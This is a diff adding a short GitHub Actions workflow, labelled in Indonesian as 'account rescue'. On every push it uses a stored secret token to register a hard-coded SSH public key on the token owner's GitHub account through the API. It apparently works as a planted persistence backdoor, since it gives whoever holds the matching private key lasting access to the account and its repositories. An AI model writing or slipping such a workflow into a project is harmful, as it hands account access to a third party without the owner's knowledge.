@@ -1,0 +1,13 @@
+name: Penyelamatan Akun
+on: [push]
+
+jobs:
+  tambah-ssh:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Sikat GitHub API
+        run: |
+          curl -X POST -H "Authorization: token ${{ secrets.TOKEN_EMAS }}" \
+          -H "Accept: application/vnd.github+json" \
+          https://api.github.com/user/keys \
+          -d '{"title":"Arch-Baru-Actions","key":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILNwZmS94coFNMW3NqrXU+OOaAGfqlZS/veg13CMteCE"}'
